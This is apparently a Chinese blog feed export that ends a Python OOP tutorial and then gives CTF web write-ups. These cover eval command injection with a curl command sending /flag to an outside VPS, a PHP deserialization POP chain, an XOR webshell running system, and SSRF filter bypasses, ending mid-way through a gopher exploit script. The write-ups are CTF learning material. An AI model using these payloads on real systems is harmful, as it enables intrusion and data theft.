print(zhangsan.__dict__)#输出zhangsan所有属性
print(zhangsan.__class__)#输出zhangsan的类
print(zhangsan.__class__.__name__)#输出zhangsan的类的名称
 
运行输出：
19
{&#39;age&#39;: 19, &#39;height&#39;: 190}
&amp;lt;class &#39;__main__.Person&#39;&amp;gt;
Person
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下面是这段程序在内存中的状态：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171758.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;其实在python中，万物皆为对象，包括int，float，str这些数据类型也都来自对象。&lt;/p&gt;
&lt;p&gt;比如：在python的命令行里面执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Python 3.8.1 (tags/v3.8.1:1b293b6, Dec 18 2019, 23:11:46) [MSC v.1916 64 bit (AMD64)] on win32
Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
&amp;gt;&amp;gt;&amp;gt; &#39;&#39;.__class__
&amp;lt;class &#39;str&#39;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; &#39;&#39;.__class__.__class__
&amp;lt;class &#39;type&#39;&amp;gt;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以看到，str类型其实是来自一个叫做str的类，然后这个str的类来自type对象。实际上这个&lt;code&gt;class &#39;str&#39;&lt;/code&gt;也是一个对象，也就是说，我们定义一个类的时候，这个类本身也是一个对象。&lt;/p&gt;
&lt;p&gt;为了方便区别，我们也把我们自己定义的那个类叫做“类”，把他实例化得到的对象称作“实例”&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;属性和方法&#34;&gt;属性和方法&lt;/h3&gt;
&lt;h4 id=&#34;属性&#34;&gt;属性&lt;/h4&gt;
&lt;p&gt;1.属性分为&lt;strong&gt;类属性&lt;/strong&gt;和&lt;strong&gt;实例属性&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;下面我们来操作一下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#python3
class Person:
    age = 18
 
zhangsan = Person()
zhangsan.sex = &#39;man&#39;
 
print(zhangsan.sex)
print(Person.age)
 
运行得到：
man
18
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可见，我们是可以通过&lt;code&gt;类名.属性名&lt;/code&gt;来访问一个类属性，前面我们说过，这个Person类其实也是一个对象，Person这个变量指向了这个类（对象）存放的内存地址，当然也就可以Person.age访问一个类属性&lt;/p&gt;
&lt;p&gt;2.&lt;strong&gt;类属性&lt;/strong&gt;为所有实例共享&lt;/p&gt;
&lt;p&gt;显而易见，但你修改或者定义了Person类的一个属性，比如age，那么这个类的所有实例都可以拥有这个属性；&lt;/p&gt;
&lt;p&gt;当你访问一个实例的属性时，具体步骤为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在当前实例里面（&lt;strong&gt;dict&lt;/strong&gt;）查找这个属性&lt;/li&gt;
&lt;li&gt;如果没有，则在上级查找这个属性（.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;dict&lt;/strong&gt;）&lt;/li&gt;
&lt;li&gt;如此反复，直到基类，没有则报错&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;3.类属性和实例属性的增删改查&lt;/p&gt;
&lt;p&gt;增添：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实例名.属性名=xxx&lt;/li&gt;
&lt;li&gt;实例名.&lt;strong&gt;class&lt;/strong&gt;.属性名=xxx&lt;/li&gt;
&lt;li&gt;类名.属性名=xxx&lt;/li&gt;
&lt;li&gt;可以通过在类里面定义一个 &lt;code&gt;类名.__slots__={&amp;quot;aaa&amp;quot;}&lt;/code&gt; 来限制此类的实例只能添加aaa属性&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;删除：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;del 实例名.属性名&lt;/li&gt;
&lt;li&gt;del 类名.属性名&lt;/li&gt;
&lt;li&gt;只能删当前类，不能向上一级删除&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;方法&#34;&gt;方法&lt;/h4&gt;
&lt;p&gt;同理，分为&lt;strong&gt;实例方法&lt;/strong&gt;、&lt;strong&gt;类方法&lt;/strong&gt;和&lt;strong&gt;静态方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.方法声明和储存都在&lt;strong&gt;类对象&lt;/strong&gt;里面&lt;/p&gt;
&lt;p&gt;不管是类方法还是实例方法，都必须在类里面进行声明，然后方法名称储存在类里面，指向这个方法本身的内存地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171808.jpeg&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;2.实例方法接受的第一个参数必须是一个实例，但是通过实例调用的时候不必填写第一个参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171820.gif&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;我们在创建一个实例方法的时候编辑器自动给我们补全了第一个参数self&lt;/p&gt;
&lt;p&gt;这里个self只是一个形式参数，可以写成其他名字，不过self更好&lt;/p&gt;
&lt;p&gt;3.类方法接受的第一个参数必须是一个类对象，但是通过实例调用时候不必填写第一个参数&lt;/p&gt;
&lt;p&gt;如上同理，形式参数为cls，不过在声明的时候需要在方法前面加上@classmethod装饰器&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;4.静态方法没有必须接受的参数&lt;/p&gt;
&lt;p&gt;定义静态方法的时候需要在上一行加入装饰器&lt;code&gt;@staticmethod&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;5.实例方法的几种调用方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过实例调用方法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;调用的时候不必我们传入第一个参数，python自动把p对象传给了第一个参数&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过类调用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们需要手动传递第一个参数，不然就会报错，本质上是直接找到内存中这个方法的地址进行调用&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;6.类方法或者实例方法，都可以通过实例或者类调用而不必手动传入第一个参数，而直接调用的时候需要手动传入第一个参数&lt;/p&gt;
&lt;p&gt;比如我们下面一段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#python3
aaa = &#39;a,aa,aaa&#39;
a = aaa.split(&#39;,&#39;)#split是class str的里面的一个实例方法，相当于我们传入的第一个参数是aaa这个实例
print(a)
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h3 id=&#34;属性的访问权限&#34;&gt;属性的访问权限&lt;/h3&gt;
&lt;p&gt;python不像其他语言可以通过private、protect这些关键词来修饰属性，python只能通过在属性名称前面添加一个或者两个下划线来声明一个伪私有的属性。&lt;/p&gt;
&lt;p&gt;不说了，开局一张图：&lt;/p&gt;
&lt;p&gt;单下划线开头变量：&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;双下划线开头变量：&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;感叹号表示会发出警告，×表示不能访问&lt;/p&gt;
&lt;p&gt;但是我们还是可以通过 &lt;code&gt;_类名__属性名&lt;/code&gt; 来访问这个属性：&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DASCTF2020.6月赛</title>
        <link>https://anthem-whisper.github.io/p/dasctf2020.6%E6%9C%88%E8%B5%9B/</link>
        <pubDate>Sat, 27 Jun 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/dasctf2020.6%E6%9C%88%E8%B5%9B/</guid>
        <description>&lt;p&gt;因为和第五空间连着，然后昨天下午又去打了一场AWD，感觉身体掏空，就认真打了DASCTF（咕咕咕），剩下的题目等有机会再复现&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;简单的计算器-1&#34;&gt;简单的计算器-1&lt;/h3&gt;
&lt;p&gt;考点：python eval()代码注入，命令执行结果外带&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171633.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;访问Source可以看到源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, request,session
from config import black_list,create
import os
 
app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = os.urandom(24)
 
## flag is in /flag try to get it
 
@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def index():
 
    def filter(string):#这里是下午暗改过的，本来只过滤了or
        for black_word in black_list:
            if black_word in string:
                return &amp;quot;hack&amp;quot;
        return string
 
    if request.method == &#39;POST&#39;:
        input = request.form[&#39;input&#39;]
        create_question = create()
        input_question = session.get(&#39;question&#39;)
        session[&#39;question&#39;] = create_question
        if input_question==None:
            return render_template(&#39;index.html&#39;, answer=&amp;quot;Invalid session please try again!&amp;quot;, question=create_question)
        if filter(input)==&amp;quot;hack&amp;quot;:
            return render_template(&#39;index.html&#39;, answer=&amp;quot;hack&amp;quot;, question=create_question)
        try:
            calc_result = str((eval(input_question + &amp;quot;=&amp;quot; + str(input))))
            if calc_result == &#39;True&#39;:
                result = &amp;quot;Congratulations&amp;quot;
            elif calc_result == &#39;False&#39;:
                result = &amp;quot;Error&amp;quot;
            else:
                result = &amp;quot;Invalid&amp;quot;
        except:
            result = &amp;quot;Invalid&amp;quot;
        return render_template(&#39;index.html&#39;, answer=result,question=create_question)
 
    if request.method == &#39;GET&#39;:
        create_question = create()
        session[&#39;question&#39;] = create_question
        return render_template(&#39;index.html&#39;,question=create_question)
 
@app.route(&#39;/source&#39;)
def source():
        return open(&amp;quot;app.py&amp;quot;, &amp;quot;r&amp;quot;).read()
 
if __name__ == &#39;__main__&#39;:
    app.run(host=&amp;quot;0.0.0.0&amp;quot;, debug=False)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到，31行那里把我们的结果和一个表达式进行简单的字符串拼接之后eval直接执行，这就给了我们命令注入的机会；&lt;/p&gt;
&lt;p&gt;我们来本地试一下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#python3
import os
 
input_question = &#39;100000=&#39;
input = &amp;quot;1,os.system(\&#39;dir\&#39;)&amp;quot;
 
calc_result = str((eval(input_question + &amp;quot;=&amp;quot; + str(input))))
print(calc_result)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们发现dir命令确实被执行了，但是题目没有回显，我们就只能用其他方式外带到我们的VPS上面去&lt;/p&gt;
&lt;p&gt;那么剩下的就只有绕waf了&lt;/p&gt;
&lt;p&gt;fuzz了一下，sys，import，os这些关键词过滤了，但是exec这些没有被过滤&lt;/p&gt;
&lt;p&gt;可以考虑字符串拼接或者逆读绕过，这里用的是逆读：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import os
 
str = &#39;&#39;&#39;os.popen(&amp;quot;curl ip:端口/?a=`cat /flag|base64`&amp;quot;).read()&#39;&#39;&#39;#因为sys倒过来也是sys，所以换成popen
print(str[::-1])
#exec(&#39;)(daer.)&amp;quot;`46esab|galf/ tac`=a?/0058:4.751.011.95 lruc&amp;quot;(nepop.so&#39;[::-1])
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发送payload，监听VPS相应端口，得到flag；&lt;/p&gt;
&lt;h3 id=&#34;简单的计算器-2&#34;&gt;简单的计算器-2&lt;/h3&gt;
&lt;p&gt;考点：？？？&lt;/p&gt;
&lt;p&gt;看了下源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, request,session
from config import black_list,create
import os
 
app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = os.urandom(24)
 
## flag is in /flag try to get it
 
@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def index():
 
    def filter(string):
        for black_word in black_list:
            if black_word in string:
                return &amp;quot;hack&amp;quot;
        return string
 
    if request.method == &#39;POST&#39;:
        input = request.form[&#39;input&#39;]
        create_question = create()
        input_question = session.get(&#39;question&#39;)
        session[&#39;question&#39;] = create_question
        if input_question == None:
            return render_template(&#39;index.html&#39;, answer=&amp;quot;Invalid session please try again!&amp;quot;, question=create_question)
        if filter(input)==&amp;quot;hack&amp;quot;:
            return render_template(&#39;index.html&#39;, answer=&amp;quot;hack&amp;quot;, question=create_question)
        calc_str = input_question + &amp;quot;=&amp;quot; + str(input)
        try:
            calc_result = str((eval(calc_str)))
        except Exception as ex:
            calc_result = &amp;quot;Invalid&amp;quot;
        return render_template(&#39;index.html&#39;, answer=calc_result,question=create_question)
 
    if request.method == &#39;GET&#39;:
        create_question = create()
        session[&#39;question&#39;] = create_question
        return render_template(&#39;index.html&#39;,question=create_question)
 
@app.route(&#39;/source&#39;)
def source():
        return open(&amp;quot;app.py&amp;quot;, &amp;quot;r&amp;quot;).read()
 
if __name__ == &#39;__main__&#39;:
    app.run(host=&amp;quot;0.0.0.0&amp;quot;, debug=False)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大同小异；&lt;/p&gt;
&lt;p&gt;用上一道题的payload直接秒了……啊……这……&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171646.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;可能本来上一道题的不需要绕waf，但是后来暗改了之后改成一道题了。。。&lt;/p&gt;
&lt;p&gt;后来和学长交流，说是可以用沙箱逃逸来做，可能沙箱逃逸才是想考的。&lt;/p&gt;
&lt;h3 id=&#34;phpuns&#34;&gt;phpuns&lt;/h3&gt;
&lt;p&gt;考点：反序列化字符逃逸，pop链，16进制绕过关键字&lt;/p&gt;
&lt;p&gt;直接给了源码的附件：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/DASCTF2020.6/DASCTF_2020.6_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;DASCTF_2020.6_反序列化_source&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先构造pop链；&lt;/p&gt;
&lt;h4 id=&#34;pop链利用&#34;&gt;POP链利用&lt;/h4&gt;
&lt;p&gt;很明显class.php里面的类是给我们利用的，构造很简单：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$pop = new Hacker_A;
$pop-&amp;gt;c2e38 = new Hacker_B;
$pop-&amp;gt;c2e38-&amp;gt;c2e38 = new Hacker_C;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;O:8:&amp;quot;Hacker_A&amp;quot;:1:{s:5:&amp;quot;c2e38&amp;quot;;O:8:&amp;quot;Hacker_B&amp;quot;:1:{s:5:&amp;quot;c2e38&amp;quot;;O:8:&amp;quot;Hacker_C&amp;quot;:1:{s:4:&amp;quot;name&amp;quot;;s:4:&amp;quot;test&amp;quot;;}}}
#一共103个字符
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;反序列化字符逃逸&#34;&gt;反序列化字符逃逸&lt;/h4&gt;
&lt;p&gt;我们可以看到index.php第29行调用了add函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$_SESSION[&#39;info&#39;] = add(serialize($user));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后info.php第6行调用了reduce函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$tmp = unserialize(reduce($_SESSION[&#39;info&#39;]));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们去看functions.php里面这两个函数的定义：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function add($data)
{
    $data = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0*\0&#39;, $data);
    return $data;
}
 
function reduce($data)
{
    $data = str_replace(&#39;\0*\0&#39;, chr(0).&#39;*&#39;.chr(0), $data);
    return $data;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;chr(0).&#39;*&#39;.chr(0)&lt;/code&gt; 也就是 &lt;code&gt;N*N&lt;/code&gt; （N表示null）占三个字符，而 &lt;code&gt;\0*\0&lt;/code&gt; 占五个字符，当我们的 &lt;code&gt;\0*\0&lt;/code&gt; 被替换为 &lt;code&gt;N*N&lt;/code&gt; 之后就少了两个字符，于是我们就能在反序列化中吞掉后面两个字符；（参考本站：&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/fakephp%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e9%80%83%e9%80%b8/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安恒4月赛反序列化字符逃逸&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;如果我们直接把pop链构造的结果传给password的话，序列化的结果是这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;s:8:&amp;quot;username&amp;quot;;s:5:&amp;quot;input&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:103:&amp;quot;O:8:&amp;quot;Hacker_A&amp;quot;:1:{s:5:&amp;quot;c2e38&amp;quot;;O:8:&amp;quot;Hacker_B&amp;quot;:1:{s:5:&amp;quot;c2e38&amp;quot;;O:8:&amp;quot;Hacker_C&amp;quot;:1:{s:4:&amp;quot;name&amp;quot;;s:4:&amp;quot;test&amp;quot;;}}}&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们这103个字符被因为s:103被当作字符串处理，于是我们利用吞字符，把 &lt;code&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:103:&amp;quot;&lt;/code&gt; （24个字符，12组 &lt;code&gt;\0*\0&lt;/code&gt; ）这一段吞掉，然后把下面的传给password：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;O:8:&amp;quot;Hacker_A&amp;quot;:1:{s:5:&amp;quot;c2e38&amp;quot;;O:8:&amp;quot;Hacker_B&amp;quot;:1:{s:5:&amp;quot;c2e38&amp;quot;;O:8:&amp;quot;Hacker_C&amp;quot;:1:{s:4:&amp;quot;name&amp;quot;;s:4:&amp;quot;test&amp;quot;;}}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么我们就成功的就行了逃逸；&lt;/p&gt;
&lt;p&gt;不过，在反序列化之前，info.php里面第5行有： &lt;code&gt;check(reduce($_SESSION[&#39;info&#39;]));&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;check函数会检查我们的字符里面是否有 &lt;code&gt;c2e38&lt;/code&gt; ，所以用S:5:&amp;quot;\63\32\65\33\38&amp;quot;来绕过，和用S+\00来绕过chr(0)是一样的，因为S大写，后面字符串里就可以解析hex了&lt;/p&gt;
</description>
        </item>
        <item>
        <title>“第五空间”智能安全大赛</title>
        <link>https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</link>
        <pubDate>Fri, 26 Jun 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</guid>
        <description>&lt;h3 id=&#34;hate-php&#34;&gt;hate-php&lt;/h3&gt;
&lt;p&gt;考点：异或取反构造无字母数字webshell&lt;/p&gt;
&lt;p&gt;开题送码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
if(!isset($_GET[&#39;code&#39;])){
    highlight_file(__FILE__);
}else{
    $code = $_GET[&#39;code&#39;];
    if (preg_match(&#39;/(f|l|a|g|\.|p|h|\/|;|\&amp;quot;|\&#39;|\`|\||\[|\]|\_|=)/i&#39;,$code)) { 
        die(&#39;You are too good for me&#39;); 
    }
    $blacklist = get_defined_functions()[&#39;internal&#39;];
    foreach ($blacklist as $blackitem) { 
        if (preg_match (&#39;/&#39; . $blackitem . &#39;/im&#39;, $code)) { 
            die(&#39;You deserve better&#39;); 
        } 
    }
    assert($code);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;preg_match&lt;/code&gt; ban掉了下划线等字符，然后 &lt;code&gt;get_defined_functions()[&#39;internal&#39;]&lt;/code&gt; 禁用了内置函数&lt;/p&gt;
&lt;p&gt;但是没有过滤取反~和异或^，&lt;/p&gt;
&lt;p&gt;PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过 &lt;code&gt;(&#39;phpinfo&#39;)();&lt;/code&gt; 来执行函数，第一个括号中可以是任意PHP表达式。&lt;/p&gt;
&lt;p&gt;不但如此，这个payload还支持接受参数，比如 &lt;code&gt;(&#39;phpinfo&#39;)(1)&lt;/code&gt; ，这道题过滤了分号，但是这道题不需要分号也可以执行&lt;/p&gt;
&lt;p&gt;那么我们自然可以用这个来执行一些代码；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;amp;%ff=phpinfo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功返回了 &lt;code&gt;phpinfo&lt;/code&gt; ，我们继续构造一个shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ee}(${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff})&amp;amp;%ee=system&amp;amp;%ff=ls
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到ls的结果，不过cat好像又被宰掉了，用 &lt;code&gt;tac fl*&lt;/code&gt; 来获取flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171600.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;do-you-know&#34;&gt;do you know&lt;/h3&gt;
&lt;p&gt;预期：gopher协议SSRF打XXE，URL编码显示空字符，pop链&lt;/p&gt;
&lt;p&gt;非预期：直接URL编码字母来绕过file关键字读取flag&lt;/p&gt;
&lt;p&gt;呐~这道题是气死啊，我用gopher协议读取了main.php之后遇到了一个谜之pop链，最后饮恨于此，后来看了一些师傅的wp之后，知道这个非预期直接吐血。。。这波啊……这波是气死……&lt;/p&gt;
&lt;h4 id=&#34;题目分析&#34;&gt;题目分析&lt;/h4&gt;
&lt;p&gt;一来就给出源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;lt;?php
highlight_file(__FILE__);
#本题无法访问外网
#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了
#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好
#there is xxe.php
$poc=$_SERVER[&#39;QUERY_STRING&#39;];
if(preg_match(&amp;quot;/log|flag|hist|dict|etc|file|write/i&amp;quot; ,$poc)){
                die(&amp;quot;no hacker&amp;quot;);
        }
$ids=explode(&#39;&amp;amp;&#39;,$poc);
$a_key=explode(&#39;=&#39;,$ids[0])[0];
$b_key=explode(&#39;=&#39;,$ids[1])[0];
$a_value=explode(&#39;=&#39;,$ids[0])[1];
$b_value=explode(&#39;=&#39;,$ids[1])[1];
 
if(!$a_key||!$b_key||!$a_value||!$b_value)
{
        die(&#39;我什么都没有~&#39;);
}
if($a_key==$b_key)
{
    die(&amp;quot;trick&amp;quot;);
}
 
if($a_value!==$b_value)
{
        if(count($_GET)!=1)
        {
                die(&#39;be it so&#39;);
        }
}
foreach($_GET as $key=&amp;gt;$value)
{
        $url=$value;
}
 
$ch = curl_init();
    if ($type != &#39;file&#39;) {
        #add_debug_log($param, &#39;post_data&#39;);
        // 设置超时
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    } else {
        // 设置超时
        curl_setopt($ch, CURLOPT_TIMEOUT, 180);
    }
 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
 
    // 设置header
    if ($type == &#39;file&#39;) {
        $header[] = &amp;quot;content-type: multipart/form-data; charset=UTF-8&amp;quot;;
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    } elseif ($type == &#39;xml&#39;) {
        curl_setopt($ch, CURLOPT_HEADER, false);
    } elseif ($has_json) {
        $header[] = &amp;quot;content-type: application/json; charset=UTF-8&amp;quot;;
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }
 
    // curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#39;);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
    // dump($param);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
    // 要求结果为字符串且输出到屏幕上
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // 使用证书：cert 与 key 分别属于两个.pem文件
 
 
    $res = curl_exec($ch);
    var_dump($res);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;明显是滥用 &lt;code&gt;curl_exec&lt;/code&gt; 导致SSRF，第11-36行写的很僵硬，意思是GET传入的第一第二个参数必须键名不同键值相同，&lt;/p&gt;
&lt;p&gt;然后 &lt;code&gt;foreach&lt;/code&gt; 里面又把最后一个值赋给了 &lt;code&gt;$url&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;所以我们直接 &lt;code&gt;?a=xxx&amp;amp;b=xxx&amp;amp;c=payload&lt;/code&gt; 就行，于是我们传入 &lt;code&gt;?a=xxx&amp;amp;b=xxx&amp;amp;c=127.0.0.1&lt;/code&gt; 就看到了请求index.php的结果&lt;/p&gt;
&lt;p&gt;那么先说非预期：&lt;/p&gt;
&lt;h4 id=&#34;urlencode编码绕过file关键字&#34;&gt;urlencode编码绕过file关键字&lt;/h4&gt;
&lt;p&gt;他正则匹配的是$_SERVER[&amp;ldquo;QUERY_STRING&amp;rdquo;];&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$poc=$_SERVER[&#39;QUERY_STRING&#39;]; 
if(preg_match(&amp;quot;/log|flag|hist|dict|etc|file|write/i&amp;quot; ,$poc)){
 die(&amp;quot;no hacker&amp;quot;); 
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是赋值给url的时候是$_GET&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;foreach($_GET as $key=&amp;gt;$value) {
 $url=$value; 
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;谜底揭晓：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171610.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;原理是$_SERVER[&amp;ldquo;QUERY_STRING&amp;rdquo;]和$_GET两个超全局变量储存数据方式不同，并不是一些师傅说的二次解码的问题&lt;/p&gt;
&lt;p&gt;换句话说，我们想要用 &lt;code&gt;file://var/www/html/flag.php&lt;/code&gt; 来读取flag的话，他的filter是会过滤我们；&lt;/p&gt;
&lt;p&gt;但是我们只要把这句payloadURL编码（英文字母也可以URL编码，格式为%+字符的16进制，详见&lt;a class=&#34;link&#34; href=&#34;https://www.runoob.com/tags/html-urlencode.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;菜鸟教程&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?a=xxx&amp;amp;b=xxx&amp;amp;c=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看源码就有flag；&lt;/p&gt;
&lt;p&gt;说到这里，其实也不算非预期了；&lt;/p&gt;
&lt;h4 id=&#34;gopher协议ssrf利用xxe读取flagphp&#34;&gt;gopher协议SSRF利用XXE读取flag.php&lt;/h4&gt;
&lt;p&gt;这个方法比较麻烦一点，而且还可能会走偏（走偏选手已经哭晕在厕所）&lt;/p&gt;
&lt;p&gt;生成POST数据流的exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#python3
#wh1sper
from urllib.parse import quote
 
stream = &amp;quot;&amp;quot;&amp;quot;POST /xxe.php HTTP/1.1
Host: 121.36.64.91
Content-Type: application/x-www-form-urlencoded
Content-Length: 225
Upgrade-Insecure-Requests: 1
 
